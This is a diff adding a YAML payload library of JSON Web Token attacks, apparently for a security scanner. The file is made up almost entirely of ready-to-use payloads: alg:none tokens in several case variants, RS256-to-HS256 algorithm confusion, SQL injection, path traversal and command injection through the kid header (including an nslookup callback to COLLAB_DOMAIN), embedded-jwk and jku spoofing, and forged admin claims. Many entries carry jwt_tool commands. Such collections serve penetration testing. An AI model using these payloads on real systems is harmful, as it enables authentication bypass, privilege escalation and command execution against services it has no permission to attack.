@@ -1,0 +1,288 @@
+defaults:
+  vuln_type: jwt
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # alg:none — header variants
+  # ============================================================
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:none and empty signature. Server must accept unsigned tokens. Replace PAYLOAD_B64 with base64url-encoded claims."
+    tags: [none_algorithm, empty_signature, bypass]
+
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:None (title case). Bypasses case-sensitive checks that only block lowercase 'none'."
+    tags: [none_algorithm, case_bypass, empty_signature]
+
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:NONE (uppercase). Tests all-caps variant of the none algorithm bypass."
+    tags: [none_algorithm, case_bypass, empty_signature]
+
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.PAYLOAD_B64."
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:nOnE (mixed case). Tests alternating-case variant to evade regex filters."
+    tags: [none_algorithm, case_bypass, empty_signature]
+
+  # ============================================================
+  # alg:none — empty and null signature variants
+  # ============================================================
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64"
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:none and no trailing dot (missing signature segment entirely). Some parsers accept two-part tokens."
+    tags: [none_algorithm, missing_signature, parser_quirk]
+
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64.AA=="
+    placeholders: [PAYLOAD_B64]
+    notes: "JWT with alg:none and null byte signature (base64url of 0x00). Tests if signature validation treats null bytes as valid empty signatures."
+    tags: [none_algorithm, null_signature, parser_quirk]
+
+  # ============================================================
+  # Algorithm confusion — RS256 to HS256
+  # ============================================================
+  - technique: alg_confusion
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD_B64.SIGNATURE"
+    placeholders: [PAYLOAD_B64, SIGNATURE]
+    notes: >
+      Algorithm confusion: change alg from RS256 to HS256 and sign with the server's
+      RSA public key as the HMAC secret. Fetch the public key from /jwks.json or
+      /.well-known/jwks.json. Use: jwt_tool -X k -pk public.pem
+    tags: [algorithm_confusion, rs256_to_hs256, key_reuse]
+
+  - technique: alg_confusion
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.PAYLOAD_B64.SIGNATURE"
+    placeholders: [PAYLOAD_B64, SIGNATURE]
+    notes: >
+      Algorithm confusion variant: RS256 to HS384. Some libraries only block HS256
+      specifically but accept other HMAC algorithms. Sign with the RSA public key using HS384.
+    tags: [algorithm_confusion, rs256_to_hs384, key_reuse]
+
+  # ============================================================
+  # kid — SQL injection
+  # ============================================================
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"' UNION SELECT 'secret' -- \"}"
+    notes: >
+      kid header with SQL injection. If the kid is resolved via a SQL query, this injects
+      a known HMAC secret ('secret'). Sign the token with 'secret' as the HS256 key.
+      Use: jwt_tool -I -hc kid -hv "' UNION SELECT 'secret' -- " -S hs256 -p 'secret'
+    tags: [kid, sqli, union_select, bypass]
+
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: error
+    risk: 3
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"' OR '1'='1\"}"
+    notes: "kid header with boolean-based SQL injection. May cause the server to return the first key in the database or trigger a SQL error revealing backend info."
+    tags: [kid, sqli, boolean, error_based]
+
+  # ============================================================
+  # kid — path traversal
+  # ============================================================
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../dev/null\"}"
+    notes: >
+      kid path traversal to /dev/null. Sign the token with an empty string as the HMAC
+      secret since /dev/null returns empty content. Use: jwt_tool -I -hc kid -hv '../../dev/null' -S hs256 -p ''
+    tags: [kid, path_traversal, dev_null, bypass]
+
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"/dev/null\"}"
+    notes: "kid set to absolute path /dev/null. Sign with empty string. Tests absolute path handling without traversal sequences."
+    tags: [kid, path_traversal, dev_null, absolute_path]
+
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../etc/hostname\"}"
+    notes: "kid path traversal to /etc/hostname. If the server reads the file content as the HMAC key, sign with the hostname value. Can confirm file read capability."
+    tags: [kid, path_traversal, file_read]
+
+  # ============================================================
+  # kid — command injection
+  # ============================================================
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key_id|sleep 5\"}"
+    notes: "kid command injection via pipe. If the kid value is passed to a shell command (e.g., to look up a key file), the pipe character triggers command execution."
+    tags: [kid, cmdi, pipe, blind]
+
+  - technique: kid_injection
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key_id;nslookup COLLAB_DOMAIN\"}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "kid command injection with OOB DNS callback. Semicolon separator followed by nslookup to confirm blind execution via collaborator DNS hit."
+    tags: [kid, cmdi, oob, dns]
+
+  # ============================================================
+  # Embedded jwk in header
+  # ============================================================
+  - technique: jwk_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_N\",\"e\":\"AQAB\"}}"
+    placeholders: [ATTACKER_N]
+    notes: >
+      Embedded JWK header injection. The attacker generates an RSA keypair, embeds the
+      public key directly in the JWT header, and signs with the private key. Vulnerable
+      servers trust the embedded key without validation. Generate with: jwt_tool -X i
+    tags: [jwk, embedded_key, key_injection, self_signed]
+
+  - technique: jwk_injection
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_N\",\"e\":\"AQAB\",\"kid\":\"attacker-key-1\"}}"
+    placeholders: [ATTACKER_N]
+    notes: "Embedded JWK with explicit kid matching. Sets the kid in both the header and the embedded jwk to ensure the server selects the attacker-controlled key."
+    tags: [jwk, embedded_key, kid_match, self_signed]
+
+  # ============================================================
+  # jku — attacker-controlled JWKS endpoint
+  # ============================================================
+  - technique: jku_spoofing
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://COLLAB_DOMAIN/.well-known/jwks.json\"}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: >
+      jku header pointing to attacker-controlled JWKS endpoint. Host a valid JWKS
+      containing the attacker's public key at the specified URL and sign the token with
+      the corresponding private key. Use: jwt_tool -X s -ju 'https://COLLAB_DOMAIN/.well-known/jwks.json'
+    tags: [jku, key_injection, oob, ssrf]
+
+  - technique: jku_spoofing
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://trusted-domain.com@COLLAB_DOMAIN/.well-known/jwks.json\"}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "jku with URL authority bypass using @ character. The URL appears to point to trusted-domain.com but actually resolves to the attacker's collaborator domain."
+    tags: [jku, url_authority_bypass, oob, ssrf]
+
+  - technique: jku_spoofing
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 3
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://trusted-domain.com/.well-known/jwks.json/../../../COLLAB_DOMAIN/jwks.json\"}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "jku with path traversal bypass. Starts with a trusted domain prefix but traverses to attacker endpoint. Tests weak URL prefix validation."
+    tags: [jku, path_traversal, oob, url_bypass]
+
+  # ============================================================
+  # Claim manipulation — privilege escalation
+  # ============================================================
+  - technique: alg_none
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9."
+    notes: "JWT with alg:none and claims {sub:1, admin:true}. Tests both signature bypass and privilege escalation via admin claim."
+    tags: [none_algorithm, claim_tampering, admin, privesc]
+
+  - technique: alg_none
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+    notes: "JWT with alg:none and claims {sub:1, role:admin}. Targets apps that use a role claim for authorization decisions."
+    tags: [none_algorithm, claim_tampering, role_admin, privesc]
+
+  # ============================================================
+  # Claim manipulation — exp far future
+  # ============================================================
+  - technique: alg_none
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiZXhwIjo5OTk5OTk5OTk5fQ."
+    notes: "JWT with alg:none and exp set to 9999999999 (year 2286). Tests if the server enforces reasonable token lifetimes or accepts arbitrarily far-future expiry."
+    tags: [none_algorithm, exp_manipulation, far_future, token_lifetime]
+
+  # ============================================================
+  # Claim manipulation — iss and aud spoofing
+  # ============================================================
+  - technique: alg_none
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiaXNzIjoiaHR0cHM6Ly90cnVzdGVkLWlkcC5jb20iLCJhdWQiOiJ0YXJnZXQtYXBwIn0."
+    notes: >
+      JWT with alg:none and spoofed iss (https://trusted-idp.com) and aud (target-app) claims.
+      Tests if the server validates the issuer and audience or blindly trusts the claims.
+    tags: [none_algorithm, iss_spoofing, aud_spoofing, trust_boundary]
+
+  # ============================================================
+  # Nested JWT — token in token
+  # ============================================================
+  - technique: alg_none
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwidG9rZW4iOiJleUpoYkdjaU9pSnViMjVsSWl3aWRIbHdJam9pU2xkVUluMC5leUp6ZFdJaU9pSXhJaXdpWVdSdGFXNGlPblJ5ZFdWOS4ifQ."
+    notes: >
+      Nested JWT: outer token contains an inner JWT in a 'token' claim. The inner JWT
+      also uses alg:none with admin:true. Tests if the server recursively parses and
+      trusts nested JWT structures without proper validation.
+    tags: [none_algorithm, nested_jwt, claim_tampering, parser_quirk]
+
+  - technique: alg_confusion
+    injection_surface: header
+    evidence_type: response_diff
+    risk: 3
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIn0.INNER_JWT."
+    placeholders: [INNER_JWT]
+    notes: >
+      Nested JWT using cty:JWT header. RFC 7519 specifies that cty:JWT indicates a nested
+      token. Replace INNER_JWT with a base64url-encoded inner JWS. Some libraries may
+      auto-unwrap and trust the inner token without verifying the outer signature.
+    tags: [nested_jwt, cty_header, rfc7519, parser_quirk]
